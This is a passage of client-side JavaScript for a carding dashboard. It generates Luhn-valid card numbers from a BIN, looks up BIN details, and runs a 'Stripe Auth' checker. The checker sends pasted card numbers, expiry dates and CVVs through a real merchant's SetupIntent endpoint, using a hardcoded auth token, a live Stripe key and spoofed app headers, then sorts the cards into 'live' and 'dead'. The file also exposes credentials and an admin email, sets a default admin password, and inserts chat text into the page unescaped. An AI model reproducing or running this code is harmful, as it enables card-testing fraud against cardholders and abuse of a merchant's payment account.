(function() {
    'use strict';

    const $ = id => document.getElementById(id);

    const session = JSON.parse(localStorage.getItem('ccSession'));
    if (!session || !session.email) {
        window.location.href = 'index.html';
        return;
    }

    function isBanned(email) {
        const banned = JSON.parse(localStorage.getItem('bannedUsers')) || [];
        return banned.some(b => {
            if (typeof b === 'string') return b === email;
            return b.email === email;
        });
    }

    if (isBanned(session.email)) {
        localStorage.removeItem('ccSession');
        alert('🚫 Your account has been permanently banned!');
        window.location.href = 'index.html';
        return;
    }

    let users = JSON.parse(localStorage.getItem('ccUsers')) || [];
    let registrationKeys = JSON.parse(localStorage.getItem('registrationKeys')) || [];
    let adminPassword = localStorage.getItem('adminPassword') || 'adminpanel';

    const currentUser = users.find(u => u.email === session.email);
    if (!currentUser) {
        localStorage.removeItem('ccSession');
        window.location.href = 'index.html';
        return;
    }

    // ---- ADMIN KONTROLÜ (SADECE REAL ADMIN) ----
    let isAdmin = false;
    if (session.email === 'apomuhammed1@gmail.com') {
        isAdmin = true;
    }

    const userId = currentUser.userId;
    let displayName = currentUser.displayName || currentUser.email.split('@')[0];
    let userAvatar = currentUser.avatar || '';
    let userBio = currentUser.bio || '';

    // ---- GAME LIMITS ----
    const today = new Date().toDateString();

    function getGameLimit(key, max) {
        const data = JSON.parse(localStorage.getItem('game_' + key + '_' + userId)) || { date: '', count: 0 };
        if (data.date !== today) {
            data.date = today;
            data.count = 0;
            localStorage.setItem('game_' + key + '_' + userId, JSON.stringify(data));
        }
        return data;
    }

    function useGameLimit(key, max) {
        const data = getGameLimit(key, max);
        if (data.count >= max) return false;
        data.count++;
        localStorage.setItem('game_' + key + '_' + userId, JSON.stringify(data));
        return true;
    }

    function getGameRemain(key, max) {
        const data = getGameLimit(key, max);
        return max - data.count;
    }

    // ---- DOM ----
    const toast = $('toast');
    const toastMessage = $('toastMessage');
    const userAvatarEl = $('userAvatar');
    const pageTitle = $('pageTitle');
    const pageSubtitle = $('pageSubtitle');
    const myBalance = $('myBalance');
    const totalUsers = $('totalUsers');
    const premiumCount = $('premiumCount');
    const normalCount = $('normalCount');
    const onlineCount = $('onlineCount');
    const myId = $('myId');
    const currentBalance = $('currentBalance');
    const userIdDisplay = $('userIdDisplay');

    const navItems = document.querySelectorAll('.nav-item[data-tab]');
    const tabContents = {
        dashboard: $('tab-dashboard'),
        generator: $('tab-generator'),
        validator: $('tab-validator'),
        binsorgu: $('tab-binsorgu'),
        stripeauth: $('tab-stripeauth'),
        wheel: $('tab-wheel'),
        guess: $('tab-guess'),
        coinflip: $('tab-coinflip'),
        dice: $('tab-dice'),
        rps: $('tab-rps'),
        bakiye: $('tab-bakiye'),
        chat: $('tab-chat'),
        ai: $('tab-ai'),
        ayarlar: $('tab-ayarlar'),
        admin: $('tab-admin')
    };
    const adminNavItem = $('adminNavItem');
    const adminLabel = $('adminLabel');
    const adminPanelBtn = $('adminPanelBtn');

    // ---- RADYO (MÜZİK) ----
    const songs = ['Dertlimusic.mp3', 'Allahyok.mp3', 'Tamam.mp3', 'Ehlan.mp3', 'Anani.mp3', 'Feryat.mp3', 'Vuruldu.mp3'];
    let currentSongIndex = 0;
    let audio = null;
    let isMusicPlaying = false;

    function initMusic() {
        audio = new Audio();
        audio.volume = 0.3;
        audio.loop = true;
        currentSongIndex = Math.floor(Math.random() * songs.length);
        loadSong(currentSongIndex);
        document.addEventListener('click', function() {
            if (audio && audio.paused && isMusicPlaying) {
                audio.play().catch(() => {});
            }
        }, { once: true });
        updateRadioUI();
    }

    function loadSong(index) {
        if (!audio) return;
        audio.src = songs[index] || 'Dertlimusic.mp3';
        audio.load();
        if (isMusicPlaying) {
            audio.play().catch(() => {});
        }
        updateRadioUI();
    }

    function toggleMusic() {
        if (!audio) return;
        if (isMusicPlaying) {
            audio.pause();
            isMusicPlaying = false;
        } else {
            audio.play().catch(() => {});
            isMusicPlaying = true;
        }
        updateRadioUI();
    }

    function prevSong() {
        currentSongIndex = (currentSongIndex - 1 + songs.length) % songs.length;
        loadSong(currentSongIndex);
        if (!isMusicPlaying) {
            isMusicPlaying = true;
            audio.play().catch(() => {});
        }
        showToast('⏪ Music changed', 'info');
    }

    function nextSong() {
        currentSongIndex = (currentSongIndex + 1) % songs.length;
        loadSong(currentSongIndex);
        if (!isMusicPlaying) {
            isMusicPlaying = true;
            audio.play().catch(() => {});
        }
        showToast('⏩ Music changed', 'info');
    }

    function updateRadioUI() {
        if (radioToggle) {
            radioToggle.innerHTML = isMusicPlaying ? '<i class="fas fa-music"></i>' : '<i class="fas fa-music-slash"></i>';
            radioToggle.classList.toggle('active', isMusicPlaying);
        }
    }

    const radioToggle = $('radioToggle');
    const radioPrev = $('radioPrev');
    const radioNext = $('radioNext');

    if (radioToggle) radioToggle.addEventListener('click', toggleMusic);
    if (radioPrev) radioPrev.addEventListener('click', prevSong);
    if (radioNext) radioNext.addEventListener('click', nextSong);

    // ---- BIN API (YENİ) ----
    async function lookupBIN(bin) {
        try {
            const response = await fetch('https://bin-api-worker.aninnayem-an.workers.dev/bin/' + bin);
            if (!response.ok) throw new Error('API error');
            const data = await response.json();
            if (data.success && data.data) {
                const d = data.data;
                return {
                    scheme: d.scheme || 'Unknown',
                    type: d.card_type || 'Unknown',
                    brand: d.scheme || 'Unknown',
                    prepaid: d.card_category === 'PREPAID' ? 'Yes' : 'No',
                    country: d.country || 'Unknown',
                    countryCode: d.issuer_country || '??',
                    bank: d.issuer || 'Unknown',
                    emoji: d.flag || '',
                    card_category: d.card_category || 'Unknown'
                };
            }
            return null;
        } catch (e) {
            console.error('BIN API Error:', e);
            return null;
        }
    }

    // ---- Toggle'lar ----
    const toolsToggle = $('toolsToggle');
    const toolsSub = $('toolsSub');
    const checkoutToggle = $('checkoutToggle');
    const checkoutSub = $('checkoutSub');
    const gamesToggle = $('gamesToggle');
    const gamesSub = $('gamesSub');
    const otherToolsToggle = $('otherToolsToggle');
    const otherToolsSub = $('otherToolsSub');

    if (toolsToggle) {
        toolsToggle.addEventListener('click', function() {
            this.classList.toggle('open');
            toolsSub.classList.toggle('open');
        });
    }
    if (checkoutToggle) {
        checkoutToggle.addEventListener('click', function(e) {
            e.stopPropagation();
            this.classList.toggle('open');
            checkoutSub.classList.toggle('open');
        });
    }
    if (gamesToggle) {
        gamesToggle.addEventListener('click', function() {
            this.classList.toggle('open');
            gamesSub.classList.toggle('open');
        });
    }
    if (otherToolsToggle) {
        otherToolsToggle.addEventListener('click', function() {
            this.classList.toggle('open');
            otherToolsSub.classList.toggle('open');
        });
    }

    // ---- ONLINE ----
    function updateOnline() {
        const sessions = JSON.parse(localStorage.getItem('ccSessions')) || [];
        const activeUsers = sessions.filter(s => (Date.now() - (s.lastActive || 0)) < 300000);
        if (onlineCount) onlineCount.textContent = activeUsers.length || 0;
    }

    function updateSession() {
        let sessions = JSON.parse(localStorage.getItem('ccSessions')) || [];
        const existing = sessions.find(s => s.email === currentUser.email);
        if (existing) { existing.lastActive = Date.now(); } else { sessions.push({ email: currentUser.email, lastActive: Date.now() }); }
        localStorage.setItem('ccSessions', JSON.stringify(sessions));
    }

    // ---- TOAST ----
    window.showToast = function(message, type = 'info') {
        toast.className = 'toast ' + type;
        toastMessage.textContent = message;
        toast.classList.add('show');
        clearTimeout(toast._timer);
        toast._timer = setTimeout(() => toast.classList.remove('show'), 3500);
    };

    // ---- HELPERS ----
    function luhnCheck(num) {
        let sum = 0, alt = false;
        for (let i = num.length - 1; i >= 0; i--) {
            let n = parseInt(num.charAt(i), 10);
            if (alt) { n *= 2; if (n > 9) n = n - 9; }
            sum += n;
            alt = !alt;
        }
        return (sum % 10 === 0);
    }

    function generateCC(bin, length) {
        let card = bin;
        while (card.length < length - 1) card += Math.floor(Math.random() * 10);
        let sum = 0, alt = false;
        for (let i = card.length - 1; i >= 0; i--) {
            let n = parseInt(card.charAt(i), 10);
            if (alt) { n *= 2; if (n > 9) n = n - 9; }
            sum += n;
            alt = !alt;
        }
        return card + ((10 - (sum % 10)) % 10);
    }

    function getCardLogo(bin) {
        const first = bin.charAt(0);
        if (first === '4') return '<i class="fab fa-cc-visa logo" style="color:#1a1f71;"></i>';
        if (first === '5') return '<i class="fab fa-cc-mastercard logo" style="color:#eb001b;"></i>';
        if (bin.startsWith('34') || bin.startsWith('37')) return '<i class="fab fa-cc-amex logo" style="color:#006fcf;"></i>';
        if (bin.startsWith('6011')) return '<i class="fab fa-cc-discover logo" style="color:#ff6000;"></i>';
        return '<i class="fas fa-credit-card logo" style="color:var(--text-muted);"></i>';
    }

    // ---- STRIPE AUTH ----
    function formatCCStripe(line) {
        try {
            const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
            if (parts.length < 4) return null;
            let cc = parts[0].replace(/\D/g, '');
            let mm = parts[1].replace(/\D/g, '');
            let yy = parts[2].replace(/\D/g, '');
            let cvv = parts[3].replace(/\D/g, '');
            if (mm.length === 1) mm = '0' + mm;
            else if (mm.length > 2) mm = mm.slice(-2);
            if (yy.length === 4) yy = yy.slice(-2);
            return { cc, mm, yy, cvv };
        } catch (e) { return null; }
    }

    async function stripeAuthCheck(cc, mm, yy, cvv) {
        try {
            const authToken = 'Possessor 1I1/xy0GbbDYwK5xkCXVxANB+NryBfyb17Wyqph2LyBehTPQ/2Za96UQi2CC3+NRDN2GCelfjjKXnxt77Bkp31OsHImCIVCedbXB+LCn8a2g4qQaLFFwSH3W9txaXhHJJcCZez1XzZ9Ceae+WoyjyLrjx/i3G20JUe+JalsAOcNqmv5bFrFXnWHK+0Cv5Me8xqTehJKekS1ykD6IbO6+s+k19WSiuTupXLT8ukPSUQc04IkDIOzoJVLFJRmrC+onZ7I6BWFWSaP27qddLdssE4plPAgdIiH6pCXbVDZCW2a+pQVA1IUiZAdYdLSLUA8/bG03JFuQ/WE/1axeUqujZCNzxpnvu30cN11LQCBjNtjuugBH7yOanNO9t9DIgGKmlabVUatpX3dEP+ceyimRkDIceHmLwUDVJpTVtqgYgIje6ELTniGXsCOY0i501fLFFocg9me6cSnn9eHPcFgXXbmuIpHUW6342fyxhai3pDCADyAEEGI6esi7GSxv2kIUX6q+5g/vDHR9Rn4v3HpWjXuCMs+wIw95+a4ZeEPBEaQ4uPeIFBAQ/4A9OmhWQV7gQ1f6BQnL8m8rFng8qr7O0/sqRo/PEutKWrBc6F19DyjJ4X7lhXIkoV8gFJmbcCfogwgkn/g15meQmm3Q6s+pmGqktTXoeeiZN6MZJSvwoHla/sqVnU3T6kymP5F+YexTNMuTahioNpe3Nw0xl4TbOwhPahPbxPZdg+o8SUsVTEma29DeGJpbm9yrQOBKxkXHtxSCQ8EsIWe/2YEGQoS/OSlvjPLAxjOdF1gZAvteSZym+ivBZPeOWO/oPnmynTHoY+fHBn1rzxI2qhtRYOpaxjJk4Y+VNdfRSiX9y4DPUdIBISgim4p30sYjNQxSnufXsJyDHEhuWxyr1Zc8oGRCeLX7omb/rkH8+361TFFHyAu4RPqJAnpWrPpFWe1nU99VvrE8cf7J94o01kalK9MmeDJiI+JuJ4+31cEQ4xtjJqlqgLfEZ1etNP1gIPl+Pfzx';

            const urlCreate = 'https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent?language=ger';
            const headersCreate = {
                'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
                'Content-Type': 'application/json; charset=utf-8',
                'Accept-Language': 'tr-TR,tr;q=0.9',
                'Authorization': authToken
            };

            const respCreate = await fetch(urlCreate, {
                method: 'POST',
                headers: headersCreate,
                body: JSON.stringify({})
            });

            const textCreate = await respCreate.text();
            const match = textCreate.match(/(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)/);
            if (!match) {
                return '❌ Declined! (client_secret not found)';
            }
            const clientSecret = match[1];
            const intentId = clientSecret.split('_secret_')[0];

            const urlConfirm = `https://api.stripe.com/v1/setup_intents/${intentId}/confirm`;
            const payload = new URLSearchParams();
            payload.append('client_secret', clientSecret);
            payload.append('expand[0]', 'payment_method');
            payload.append('payment_method_data[allow_redisplay]', 'unspecified');
            payload.append('payment_method_data[billing_details][address][country]', 'TR');
            payload.append('payment_method_data[card][cvc]', cvv);
            payload.append('payment_method_data[card][exp_month]', mm);
            payload.append('payment_method_data[card][exp_year]', yy);
            payload.append('payment_method_data[card][number]', cc);
            payload.append('payment_method_data[payment_user_agent]', 'stripe-ios/23.27.6; variant.legacy; PaymentSheet');
            payload.append('payment_method_data[type]', 'card');
            payload.append('use_stripe_sdk', 'true');

            const headersConfirm = {
                'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
                'x-stripe-user-agent': '{"version":"0.37.3","url":"https:\\/\\/github.com\\/stripe\\/stripe-react-native","type":"iPad15,3","lang":"objective-c","name":"@stripe\\/stripe-react-native","bindings_version":"23.27.6","model":"iPad","vendor_identifier":"B0C09781-0D45-4FCD-BCD0-AE0A46B41CDC","os_version":"18.6","partner_id":""}',
                'stripe-version': '2020-08-27',
                'authorization': 'Bearer pk_live_51ONMPJCYEondzKCZD7N8xv2rgbCsyLOv2tEYGupao0fdROvY0DrlEZh1gUKuofYPBfD8NK35GGAV6t4OBMjHuIA200FTFfkaiy',
                'accept-language': 'tr-TR,tr;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded'
            };

            const respConfirm = await fetch(urlConfirm, {
                method: 'POST',
                headers: headersConfirm,
                body: payload
            });

            const json = await respConfirm.json();

            if (json.error) {
                const msg = json.error.message || 'Unknown error';
                return `❌ Declined! (${msg})`;
            }

            const status = json.status;
            if (status === 'succeeded') {
                return '✅ Approved! (AUTHED)';
            } else if (status === 'requires_action' || status === 'requires_source_action') {
                return '🔐 3D Secure! (3DS)';
            } else {
                return `❌ Declined! (UNKNOWN STATUS - ${status})`;
            }
        } catch (err) {
            return `❌ Error: ${err.message.slice(0, 50)}`;
        }
    }

    // ---- STRIPE AUTH UI ----
    let stripeResults = [];

    function renderStripeResults(filter = 'all') {
        let filtered = [];
        if (filter === 'all') filtered = stripeResults;
        else if (filter === 'live') filtered = stripeResults.filter(r => r.status.includes('Approved') || r.status.includes('3D Secure'));
        else if (filter === 'dead') filtered = stripeResults.filter(r => !r.status.includes('Approved') && !r.status.includes('3D Secure'));

        if (!filtered.length) {
            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">No results.</div>';
            return;
        }
        let html = '';
        filtered.forEach(r => {
            const statusColor = r.status.includes('Approved') || r.status.includes('3D Secure') ? '#34c759' : '#ff3b30';
            html += `
                <div style="padding:4px 0;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
                    <span style="font-family:monospace;">Card: ${r.cc}|${r.mm}|${r.yy}|${r.cvv}</span>
                    <span style="font-weight:600;color:${statusColor};">Resp: ${r.status}</span>
                </div>
            `;
        });
        stripeResult.innerHTML = html;
    }

    function updateStripeCounts() {
        const live = stripeResults.filter(r => r.status.includes('Approved') || r.status.includes('3D Secure')).length;
        const dead = stripeResults.length - live;
        liveCount.textContent = live;
        deadCount.textContent = dead;
        totalCount.textContent = stripeResults.length;
    }

    const stripeInput = $('stripeInput');
    const stripePasteBtn = $('stripePasteBtn');
    const stripeCheckBtn = $('stripeCheckBtn');
    const stripeResult = $('stripeResult');
    const liveCount = $('liveCount');
    const deadCount = $('deadCount');
    const totalCount = $('totalCount');
    const liveFilterBtn = $('liveFilterBtn');
    const deadFilterBtn = $('deadFilterBtn');
    const allFilterBtn = $('allFilterBtn');

    if (stripePasteBtn) {
        stripePasteBtn.addEventListener('click', async function() {
            try {
                const text = await navigator.clipboard.readText();
                const lines = text.split('\n').map(l => l.trim()).filter(l => l);
                const cleaned = lines.map(l => {
                    const parts = l.split(/[|/,\s]+/).filter(p => p.length > 0);
                    if (parts.length >= 4) {
                        const cc = parts[0].replace(/\D/g, '');
                        const mm = parts[1].replace(/\D/g, '').padStart(2, '0').slice(0,2);
                        const yy = parts[2].replace(/\D/g, '').slice(0,2);
                        const cvv = parts[3].replace(/\D/g, '').slice(0,4);
                        return `${cc}|${mm}|${yy}|${cvv}`;
                    }
                    return l;
                });
                stripeInput.value = cleaned.join('\n');
                showToast('Pasted and cleaned.', 'success');
            } catch (e) {
                showToast('Cannot read clipboard, paste manually.', 'error');
            }
        });
    }

    // ---- STRIPE CHECK (DÜZELTİLDİ) ----
    if (stripeCheckBtn) {
        stripeCheckBtn.addEventListener('click', async function() {
            const lines = stripeInput.value.split('\n').map(l => l.trim()).filter(l => l);
            if (!lines.length) { showToast('Enter cards.', 'error'); return; }

            const cost = lines.length * 3;
            if (currentUser.balance < cost) {
                showToast(`Insufficient balance! Need ${cost} TL (3 TL/card).`, 'error');
                return;
            }

            stripeResults = [];
            stripeResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">⏳ Checking...</div>';
            this.disabled = true;
            this.textContent = '⏳ Checking...';

            try {
                for (const line of lines) {
                    const formatted = formatCCStripe(line);
                    if (!formatted) {
                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Error' });
                        continue;
                    }
                    const { cc, mm, yy, cvv } = formatted;
                    const result = await stripeAuthCheck(cc, mm, yy, cvv);
                    stripeResults.push({ cc, mm, yy, cvv, status: result });
                    updateStripeCounts();
                    renderStripeResults('all');
                }
            } catch (err) {
                showToast('Error occurred during check.', 'error');
            } finally {
                // Bakiye düş
                currentUser.balance -= cost;
                saveUsers();
                updateUI();

                // Giriş alanını temizle
                stripeInput.value = '';

                // Butonu eski haline getir (START BUTONU)
                this.disabled = false;
                this.textContent = '▶️ Start Check (3 TL/card)';

                // CHECKING YAZISI KALDIRILDI - Sonuçları göster
                updateStripeCounts();
                stripeResult.innerHTML = '';
                renderStripeResults('all');
                showToast(`✅ Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
            }
        });
    }

    // Filtreleme
    if (liveFilterBtn) liveFilterBtn.addEventListener('click', function() {
        [liveFilterBtn, deadFilterBtn, allFilterBtn].forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        renderStripeResults('live');
    });
    if (deadFilterBtn) deadFilterBtn.addEventListener('click', function() {
        [liveFilterBtn, deadFilterBtn, allFilterBtn].forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        renderStripeResults('dead');
    });
    if (allFilterBtn) allFilterBtn.addEventListener('click', function() {
        [liveFilterBtn, deadFilterBtn, allFilterBtn].forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        renderStripeResults('all');
    });

    // ---- UI (ADMIN BUTONU) ----
    function updateUI() {
        if (userAvatar) {
            userAvatarEl.innerHTML = `<img src="${userAvatar}" style="width:40px;height:40px;border-radius:50%;object-fit:cover;">`;
            if (profileAvatar) profileAvatar.src = userAvatar;
        } else {
            userAvatarEl.textContent = displayName.charAt(0).toUpperCase();
            if (profileAvatar) {
                profileAvatar.src =
                    `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='80' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23007aff'/%3E%3Ctext x='40' y='52' text-anchor='middle' font-size='32' fill='white' font-weight='600' font-family='Arial'%3E${displayName.charAt(0).toUpperCase()}%3C/text%3E%3C/svg%3E`;
            }
        }
        myBalance.textContent = currentUser.balance.toFixed(2) + ' TL';
        currentBalance.textContent = currentUser.balance.toFixed(2) + ' TL';
        totalUsers.textContent = users.length;
        const prems = users.filter(u => u.premium).length;
        premiumCount.textContent = prems;
        normalCount.textContent = users.length - prems;
        myId.textContent = userId;
        userIdDisplay.textContent = userId;
        if (displayNameInput) displayNameInput.value = displayName;
        if (profileId) profileId.value = userId;
        if (userBioInput) userBioInput.value = userBio || '';
        if (themeSelect) themeSelect.value = document.documentElement.getAttribute('data-theme') || 'light';

        // ---- ADMIN PANELİ BUTONU (SADECE GERÇEK ADMIN) ----
        const isRealAdmin = session.email === 'apomuhammed1@gmail.com';
        if (adminPanelBtn) {
            adminPanelBtn.style.display = isRealAdmin ? 'flex' : 'none';
        }
        if (adminNavItem) {
            adminNavItem.style.display = isRealAdmin ? 'flex' : 'none';
        }
        if (adminLabel) {
            adminLabel.style.display = isRealAdmin ? 'block' : 'none';
        }

        // Oyun hakları
        if (spinUsed) {
            const spinData = getGameLimit('spin', 1);
            spinUsed.textContent = spinData.count >= 1 ? 0 : 1;
        }
        if (guessLeft) guessLeft.textContent = getGameRemain('guess', 4);
        if (coinRemain) coinRemain.textContent = getGameRemain('coinflip', 4);
        if (diceRemain) diceRemain.textContent = getGameRemain('dice', 4);
        if (rpsRemain) rpsRemain.textContent = getGameRemain('rps', 4);

        renderChatMessages();
        renderAIMessages();
        updateOnline();
    }

    // ---- SAVE FUNCTION ----
    function saveUsers() {
        localStorage.setItem('ccUsers', JSON.stringify(users));
    }

    // ---- ADMIN BUTONUNA TIKLAYINCA ----
    if (adminPanelBtn) {
        adminPanelBtn.addEventListener('click', function() {
            switchTab('admin');
        });
    }

    // ---- TAB ----
    function switchTab(tabId) {
        Object.values(tabContents).forEach(el => { if (el) el.classList.add('hidden'); });
        if (tabContents[tabId]) tabContents[tabId].classList.remove('hidden');
        navItems.forEach(item => { if (item) item.classList.toggle('active', item.dataset.tab === tabId); });
        updatePageTitle(tabId);
        if (tabId === 'dashboard') updateUI();
        if (tabId === 'admin' && session.email === 'apomuhammed1@gmail.com') {
            if (adminLock) { adminLock.style.display = 'block';
                adminContent.style.display = 'none';
                adminLockError.style.display = 'none';
                adminPassInput.value = ''; }
        }
        if (tabId === 'chat') renderChatMessages();
        if (tabId === 'ai') renderAIMessages();
        if (tabId === 'wheel') drawWheel();
        if (tabId === 'stripeauth') {
            updateStripeCounts();
            renderStripeResults('all');
            [liveFilterBtn, deadFilterBtn, allFilterBtn].forEach(b => b.classList.remove('active'));
            if (allFilterBtn) allFilterBtn.classList.add('active');
        }
        closeSidebar();
    }

    function updatePageTitle(tabId) {
        const titles = {
            dashboard: { title: 'Home', sub: 'Overview' },
            generator: { title: 'CC Generator', sub: 'Card generator' },
            validator: { title: 'CC Validator', sub: 'Card validation' },
            binsorgu: { title: 'BIN Lookup', sub: 'BIN information' },
            stripeauth: { title: 'Stripe Auth', sub: 'Card authorization' },
            wheel: { title: 'Spin Wheel', sub: 'Daily free spin!' },
            guess: { title: 'Guess Number', sub: 'Guess 1-100' },
            coinflip: { title: 'Coin Flip', sub: 'Try your luck' },
            dice: { title: 'Dice Roll', sub: 'Try your luck' },
            rps: { title: 'Rock Paper Scissors', sub: 'Play vs computer' },
            bakiye: { title: 'Balance', sub: 'Balance management' },
            chat: { title: 'Chat', sub: 'Room chat' },
            ai: { title: 'Zenit AI', sub: 'AI assistant' },
            ayarlar: { title: 'Settings', sub: 'Profile settings' },
            admin: { title: 'Admin Panel', sub: 'User management' }
        };
        const info = titles[tabId] || titles.dashboard;
        pageTitle.textContent = info.title;
        pageSubtitle.textContent = info.sub;
    }

    // ---- CC GENERATOR ----
    const genBin = $('genBin');
    const genCvv = $('genCvv');
    const genMonth = $('genMonth');
    const genYear = $('genYear');
    const genCount = $('genCount');
    const generateBtn = $('generateBtn');
    const ccList = $('ccList');
    const copyAllBtn = $('copyAllBtn');

    if (generateBtn) {
        generateBtn.addEventListener('click', function() {
            if (currentUser.balance < 1) {
                showToast('Insufficient balance!', 'error');
                return;
            }
            const bin = genBin.value.trim() || '411111';
            const cvv = genCvv.value.trim() || '123';
            const month = genMonth.value.trim() || '12';
            const year = genYear.value.trim() || '2028';
            const count = parseInt(genCount.value) || 5;
            if (count < 1 || count > 50) { showToast('Count must be 1-50.', 'error'); return; }

            currentUser.balance -= 1;
            saveUsers();

            let html = '';
            for (let i = 0; i < count; i++) {
                let card = generateCC(bin, 16);
                const isValid = luhnCheck(card);
                const status = isValid ? '✅' : '❌';
                const statusColor = isValid ? '#34c759' : '#ff3b30';
                html += `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border-color);font-family:monospace;">
                    <span>${card}|${month}|${year}|${cvv}</span>
                    <span style="color:${statusColor};font-weight:600;">${status}</span>
                </div>`;
            }
            ccList.innerHTML = html || '<div style="color:var(--text-muted);text-align:center;padding:16px;">No cards generated.</div>';
            updateUI();
            showToast(`${count} cards generated. 1 TL deducted.`, 'success');
        });
    }

    if (copyAllBtn) {
        copyAllBtn.addEventListener('click', function() {
            const items = ccList.querySelectorAll('div > span:first-child');
            const texts = Array.from(items).map(el => el.textContent.trim());
            if (!texts.length) { showToast('No cards to copy.', 'error'); return; }
            navigator.clipboard.writeText(texts.join('\n')).then(() => {
                showToast('All cards copied!', 'success');
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = texts.join('\n');
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                ta.remove();
                showToast('All cards copied!', 'success');
            });
        });
    }

    // ---- VALIDATOR ----
    const ccValidateInput = $('ccValidateInput');
    const validateBtn = $('validateBtn');
    const validateResult = $('validateResult');

    if (validateBtn) {
        validateBtn.addEventListener('click', function() {
            const raw = ccValidateInput.value.replace(/\s/g, '');
            if (!raw) { validateResult.innerHTML = `<span class="label">Result</span><span class="value" style="color:var(--text-muted);">Enter a card number.</span>`; return; }
            if (!/^\d+$/.test(raw)) { validateResult.innerHTML = `<span class="label">Result</span><span class="value invalid">❌ Only digits.</span>`; return; }
            const isValid = luhnCheck(raw);
            const masked = raw.replace(/(\d{4})/g, '$1 ').trim();
            const bin = raw.substring(0, 6);
            lookupBIN(bin).then(info => {
                let extra = info ? `<div style="margin-top:6px;font-size:12px;color:var(--text-muted);">Bank: ${info.bank} | Type: ${info.type} | Country: ${info.country} ${info.emoji}</div>` : '';
                validateResult.innerHTML = `
                    <span class="label">Result</span>
                    <span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? '✅ Valid' : '❌ Invalid'} — ${masked}</span>
                    ${extra}
                `;
            }).catch(() => {
                validateResult.innerHTML = `<span class="label">Result</span><span class="value ${isValid ? 'valid' : 'invalid'}">${isValid ? '✅ Valid' : '❌ Invalid'} — ${masked}</span>`;
            });
        });
        ccValidateInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') validateBtn.click(); });
    }

    // ---- BIN (YENİ API) ----
    const binInput = $('binInput');
    const binSorguBtn = $('binSorguBtn');
    const binResult = $('binResult');

    if (binSorguBtn) {
        binSorguBtn.addEventListener('click', function() {
            const bin = binInput.value.replace(/\s/g, '');
            if (!bin || bin.length < 6) {
                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value" style="color:var(--text-muted);">Enter at least 6 digits.</span>`;
                return;
            }
            if (!/^\d+$/.test(bin)) {
                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">❌ Only digits.</span>`;
                return;
            }
            binResult.innerHTML = `<span class="label">BIN Info</span><span class="value" style="color:var(--text-muted);">Searching...</span>`;
            lookupBIN(bin).then(info => {
                if (!info) { binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">❌ BIN not found.</span>`; return; }
                binResult.innerHTML = `
                    <span class="label">BIN Info</span>
                    <div class="bin-result-grid">
                        <div class="bin-item"><span class="bin-label">Scheme</span><span class="bin-value">${info.scheme}</span></div>
                        <div class="bin-item"><span class="bin-label">Type</span><span class="bin-value">${info.type}</span></div>
                        <div class="bin-item"><span class="bin-label">Brand</span><span class="bin-value">${info.brand}</span></div>
                        <div class="bin-item"><span class="bin-label">Category</span><span class="bin-value">${info.card_category || 'Unknown'}</span></div>
                        <div class="bin-item"><span class="bin-label">Country</span><span class="bin-value">${info.country} ${info.emoji}</span></div>
                        <div class="bin-item"><span class="bin-label">Issuer</span><span class="bin-value">${info.bank}</span></div>
                    </div>
                `;
            }).catch(() => {
                binResult.innerHTML = `<span class="label">BIN Info</span><span class="value invalid">❌ Lookup error.</span>`;
            });
        });
        binInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') binSorguBtn.click(); });
    }

    // ---- BALANCE ----
    const depositAmount = $('depositAmount');
    const transferId = $('transferId');
    const transferAmount = $('transferAmount');

    window.deposit = function() {
        const amount = parseFloat(depositAmount.value);
        if (!amount || amount <= 0) { showToast('Enter a valid amount.', 'error'); return; }
        currentUser.balance += amount;
        depositAmount.value = '';
        saveUsers();
        updateUI();
        showToast(`${amount.toFixed(2)} TL deposited.`, 'success');
    };

    window.transfer = function() {
        const targetId = transferId.value.trim();
        const amount = parseFloat(transferAmount.value);
        if (!targetId || !amount || amount <= 0) { showToast('Enter recipient ID and amount.', 'error'); return; }
        if (targetId === userId) { showToast('Cannot transfer to yourself.', 'error'); return; }
        if (amount > currentUser.balance) { showToast('Insufficient balance.', 'error'); return; }
        const targetUser = users.find(u => u.userId === targetId);
        if (!targetUser) { showToast('Recipient not found.', 'error'); return; }
        currentUser.balance -= amount;
        targetUser.balance += amount;
        transferId.value = '';
        transferAmount.value = '';
        saveUsers();
        updateUI();
        showToast(`${amount.toFixed(2)} TL transferred.`, 'success');
    };

    // ---- CHAT ----
    const chatMessages = $('chatMessages');
    const chatInput = $('chatInput');
    const sendChatBtn = $('sendChatBtn');
    let chatMessagesData = JSON.parse(localStorage.getItem('chatMessages')) || [];

    function saveChatMessages() { localStorage.setItem('chatMessages', JSON.stringify(chatMessagesData)); }

    function renderChatMessages() {
        if (!chatMessages) return;
        chatMessages.innerHTML = '';
        if (!chatMessagesData.length) {
            chatMessages.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:20px;">No messages yet.</div>';
            return;
        }
        chatMessagesData.forEach(msg => {
            const div = document.createElement('div');
            div.className = 'chat-msg';
            div.innerHTML = `<span class="sender">${msg.sender}</span><span class="text">${msg.text}</span><span class="time">${new Date(msg.time).toLocaleTimeString()}</span>`;
            chatMessages.appendChild(div);
        });
